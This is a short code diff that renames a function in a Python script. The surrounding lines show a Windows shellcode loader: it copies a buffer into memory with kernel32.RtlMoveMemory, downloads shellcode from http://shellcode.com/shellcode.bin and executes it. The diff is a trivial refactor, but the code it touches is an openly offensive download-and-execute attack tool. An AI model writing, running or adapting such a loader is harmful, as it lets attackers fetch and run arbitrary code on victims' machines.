@@ -24,7 +24,7 @@ def write_memory(buf):
     kernel32.RtlMoveMemory(ptr, buf, length)
     return ptr
 
-def run(shellcode):
+def run_shellcode(shellcode):
     buffer = ctypes.create_string_buffer(shellcode)
     ptr = write_memory(buffer)
 
@@ -34,4 +34,4 @@ def run(shellcode):
 if __name__=='__main__':
     url = "http://shellcode.com/shellcode.bin"
     shellcode = get_shellcode(url)
-    run(shellcode)
+    run_shellcode(shellcode)
